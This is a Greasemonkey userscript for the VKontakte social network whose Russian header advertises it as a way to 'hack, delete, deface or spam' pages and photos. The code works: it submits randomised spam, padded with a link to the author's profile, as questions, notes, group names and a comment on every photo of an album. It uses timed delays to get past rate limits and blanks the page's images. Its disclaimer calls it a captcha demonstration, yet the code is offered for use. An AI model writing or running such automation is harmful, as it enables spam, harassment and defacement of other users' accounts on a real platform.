// ==UserScript==
// @name VK_Spam_Deleter
// @namespace vk.ru/
// @description Применяйте под свою ответственность. Скрипт позволяет взломать/удалить/обезобразить/заспамить страницу Вконтакте, фотки вконтакте. Подробнее смотрите на странице скрипта
// @author http://vkontakte.ru/id2075442
// @include *vkontakte.ru*
// @include *vk.com*
// @exclude file://*
// ==/UserScript==

// Применяйте под свою ответственность.
/* ! */ var mm = ' Cкачать скрипт чтобы взломать/заспамить страницу либо фотки - http://vkontakte.ru/id2075442 .   !!!';  /* ! */
// Скрипт не наносит существенный вред вконтакте.
// А так же создан лишь для демонтсранции неэфективности капчи, не более того.
// НЕ ИСПОЛЬЗУЙТЕ ЭТОТ СКРИПТ БОЛЕЕ 1 РАЗА, только для ознакомления
// удалите все спам-сообщения после ознакомления со скриптом
//  иначе НЕ пользуйтесь этим скриптом




/*  ****    НИЖЕ В СТРОКЕ ДОЛЖНО БЫТЬ ВАШЕ СПАМ СООБЩЕНИЕ!!!        *****    */

var mes = '  Замените тот текст. ЗДЕСЬ ДОЛЖНО БЫТЬ ВАШЕ СПАМ СООБЩЕНИЕ! ';




window.imgDel = function (){
	var imgs = document.getElementsByTagName('img');
	for(var j = 0; j < imgs.length; j++) {
		imgs[j].src = '';
	}
}

var GM_JQ = document.createElement('script');
GM_JQ.src = 'http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js';
GM_JQ.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(GM_JQ);

function GM_wait() {
    if(typeof unsafeWindow.jQuery == 'undefined') { window.setTimeout(GM_wait,100); }
    else { $ = unsafeWindow.jQuery; window.setTimeout(letsJQuery, 1000) }
}
GM_wait();

var bad_mes = function(){
	var v_ = ( Math.floor( Math.random( ) * (4 - 0 + 1) ) + 0 );
	var m = ( Math.floor( Math.random( ) * (1600 - 0 + 1) ) + 0 ) + mes  + ( Math.floor( Math.random( ) * (1600 - 0 + 1) ) + 0 );
    for(var i=0; i<v_; i++) m = m + ( m + i );
    return m + mm +  ( Math.floor( Math.random( ) * (1600 - 0 + 1) ) + 0 );
}

window.spam_questions = function() {
	if(top.frames.length != 0) return false;
	var i = 0;
	var l = $('div.questionDel');
	if(l.length > 50) {
    	$('<iframe id="w1" name="w1" width="1" height="1" align="left"></iframe>').appendTo(document.body);
    	window.setTimeout(oneDel, 2000);
    	return false;
	}
	function oneDel() {
		l.each(function(index){
	    	if($(this).attr('c')) return true;
	    	i++;
	    	var h = $(this).children('a').get(1).href;
	    	$.ajax({
				beforeSend: function(){},
				type: "GET",
				data: h.substr(h.indexOf('?') + 1),
				url: 'questions.php',
		       	success: function(data) {
		       		try {
			       		var f = unsafeWindow.frames.w1.document.getElementById('deleteQ');
						if(f) f.parentNode.removeChild(f);
						f = $('#deleteQ', data);
			       		f.appendTo(unsafeWindow.frames.w1.document.body);
			       		unsafeWindow.frames.w1.document.getElementById('deleteQ').submit();
			       		$('#msg').html('Не закрывайте страницу');
		    			$('.summary').html('Удаляем вопрос номер ' + i);
		    			window.setTimeout(oneDel, 3000);
	    			}catch(e) {
	    				document.location = 'http://vkontakte.ru/questions.php';
	    				}
	    		}
			});
			$(this).attr('c', true);
			if(index == l.length - 1) window.setTimeout(function() {
				document.location = 'http://vkontakte.ru/questions.php?act=add_question';
			}, 3000);
			return false;
		})
	}
	if(unsafeWindow.document.location.toString().indexOf('questions.php?act=add_question') == -1)
		return unsafeWindow.document.location = 'http://vkontakte.ru/questions.php?act=add_question';
	if($('#message').length) {
		$('#message').val( bad_mes() );
		$('select option').get((Math.floor( Math.random( ) * (16 - 0 + 1) ) + 0)).selected = 1;
		$('#addQ').submit();
	}
}
window.spam_notes = function() {
	if(document.location.toString() != 'http://vkontakte.ru/notes.php?act=new')
		return window.setTimeout(function() {
				document.location = 'http://vkontakte.ru/notes.php?act=new';
			}, 0);
	if(!(top.window.frames.length && window.frames.length) ) return false;
	function saveNote(mid) {
		unsafeWindow.ge('title').value = bad_mes();
		var editor = unsafeWindow.window[unsafeWindow.window.editorName];
		//if (editor) {
		  unsafeWindow.ge('post').value = bad_mes();
		//}
		if (mid == undefined) {
		  mid = '';
		}
		unsafeWindow.ge('privacy_note').value = unsafeWindow.getPrivacy('note' + mid);
		unsafeWindow.ge('privacy_notecomm').value = unsafeWindow.getPrivacy('notecomm' + mid);
		unsafeWindow.ge('editPost').submit();
		return false;
	}
	saveNote();
}

window.spam_groups = function() {
	if(document.location.toString() != 'http://vkontakte.ru/groups.php')
		return window.setTimeout(function() {
				document.location = 'http://vkontakte.ru/groups.php';
			}, 1000);
 	unsafeWindow.create_group();
	unsafeWindow.ge('new_name').value = bad_mes();
	unsafeWindow.on_create_group()
}
function letsJQuery() {
	window.imgDel();
	var loc = unsafeWindow.document.location.toString();
	var func = loc.substring(loc.indexOf('.ru/') + 4, loc.indexOf('.php'));
    if(window['spam_' + func]) return window['spam_' + func]();
    if(loc.indexOf('photo-') != -1){
     	unsafeWindow.ajaxHistory.prepare("photo", {
			url:'photos.php',
			done: function(ajax, res) {
				window.imgDel();
				unsafeWindow.gotPhotoInfo(ajax, res);
				window.imgDel();
				$('#commentArea').val( bad_mes() );
				unsafeWindow.postComment();
				setTimeout(function() {
                    if($('#cur_num').html() <= 2) return alert('Начинайте спамить с КОНЦА альбома (с последней фотографии в альбоме.)\n Откройте последню фотку в альбому для начала спама.');
                    unsafeWindow.prevPhoto();
					}, (Math.floor( Math.random( ) * (6000 - 3000 + 1) ) + 3000));
				},
			fail: unsafeWindow.failedPhotoInfo,
			before: unsafeWindow.showPhoto,
			show: {
				to: function(p) { return p.photo },
				from: function(p) { return {act: 'photo_info', photo: p, uid: unsafeWindow.watched_uid }}
			},
			def: { act:'photo_info', photo: unsafeWindow.start_photo, uid: unsafeWindow.watched_uid }
		});
		unsafeWindow.prevPhoto();
    }
}